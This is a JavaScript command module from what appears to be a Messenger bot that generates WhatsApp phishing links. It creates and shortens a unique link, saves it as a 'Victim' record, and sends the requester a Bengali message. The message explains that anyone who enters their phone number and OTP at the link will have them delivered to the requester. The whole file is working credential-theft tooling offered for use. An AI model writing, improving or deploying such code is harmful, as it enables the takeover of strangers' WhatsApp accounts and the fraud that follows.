const { nanoid } = require('nanoid');
const Victim = require('../models/Victim');
const { getConfig, sendMessage, shortenUrl } = require('../utils/helpers');

module.exports = {
    execute: async (senderId, args, sendMessage) => {
        try {
            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';

            const id = nanoid(10);
            const longLink = `${baseUrl}/wp/${id}`;
            const shortLink = await shortenUrl(longLink);

            const victim = new Victim({
                id: id,
                fbId: senderId,
                type: 'wp',
                shortLink: shortLink || longLink,
                timestamp: new Date(),
                status: 'pending'
            });
            await victim.save();

            const msg = `📱 হোয়াটসঅ্যাপ লিংক সফলভাবে তৈরি হয়েছে! 🎉

🔗 আপনার লিংক: ${longLink}

📌 কাজ করার নিয়ম:
কেউ এই লিঙ্কে প্রবেশ করে নাম্বার ও ওটিপি দিলেই তা আপনার কাছে চলে আসবে। 💯
━━━━━━━━━━━━━━━━━━━━
🔗 Owner: m.me/2ndJohnnySins`;

            await sendMessage(senderId, msg);
        } catch (err) {
            console.error('❌ WP command error:', err);
            await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
        }
    }
};